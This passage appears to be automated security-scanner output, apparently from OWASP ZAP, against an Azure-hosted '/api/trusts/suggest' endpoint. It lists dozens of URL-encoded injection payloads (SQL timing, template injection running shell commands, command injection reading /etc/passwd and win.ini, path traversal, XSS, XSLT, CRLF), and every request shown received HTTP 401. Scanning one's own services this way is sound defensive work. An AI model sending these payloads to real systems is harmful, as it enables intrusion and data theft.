  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2522java.lang.Thread.sleep%2522%252815000%2529
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2523%257B%2525x%2528sleep+15%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2527%2528
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%252F%252F980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%252Fetc%252Fpasswd
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%252Fsuggest
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%252FWEB-INF%252Fweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253C%2521--
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253Cxsl%253Avalue-of+select%253D%2522document%2528%2527http%253A%252F%252Fs198d01-ebis-establishment-fa.azurewebsites.net%253A22%2527%2529%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253Cxsl%253Avalue-of+select%253D%2522php%253Afunction%2528%2527exec%2527%252C%2527erroneous_command+2%253E%2526amp%253B1%2527%2529%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253Cxsl%253Avariable+name%253D%2522rtobject%2522+select%253D%2522runtime%253AgetRuntime%2528%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522process%2522+select%253D%2522runtime%253Aexec%2528%2524rtobject%252C%2527erroneous_command%2527%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522waiting%2522+select%253D%2522process%253AwaitFor%2528%2524process%2529%2522%252F%253E%250A%253Cxsl%253Avalue-of+select%253D%2522%2524process%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%255Csuggest
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%255CWEB-INF%255Cweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%255D%255D%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%257Bsystem%2528%2522sleep+15%2522%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=0W45pz4p
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=0x92atek3upr1cmk3xm886g5cd578yv5qkxcsii1nll5mzqq4ggmd9ny
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=5%253BURL%253D%2527https%253A%252F%252F980414377652208366.owasp.org%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=any%250ASet-cookie%253A+Tamper%253Dd0675c52-b33d-4f4d-9d2e-6839ae1eb396
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=any%250D%250ASet-cookie%253A+Tamper%253Dd0675c52-b33d-4f4d-9d2e-6839ae1eb396
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=any%250D%250ASet-cookie%253A+Tamper%253Dd0675c52-b33d-4f4d-9d2e-6839ae1eb396%250D%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=any%253F%250ASet-cookie%253A+Tamper%253Dd0675c52-b33d-4f4d-9d2e-6839ae1eb396
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=any%253F%250D%250ASet-cookie%253A+Tamper%253Dd0675c52-b33d-4f4d-9d2e-6839ae1eb396
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=any%253F%250D%250ASet-cookie%253A+Tamper%253Dd0675c52-b33d-4f4d-9d2e-6839ae1eb396%250D%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=c%253A%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=c%253A%252FWindows%252Fsystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=c%253A%255C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=c%253A%255CWindows%255Csystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=cat+%252Fetc%252Fpasswd
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522%2526cat+%252Fetc%252Fpasswd%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522%2526sleep+15.0%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522%2526timeout+%252FT+15.0%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522%253Bget-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522%253Bsleep+15.0%253B%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522%253Bstart-sleep+-s+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522%257Ctimeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
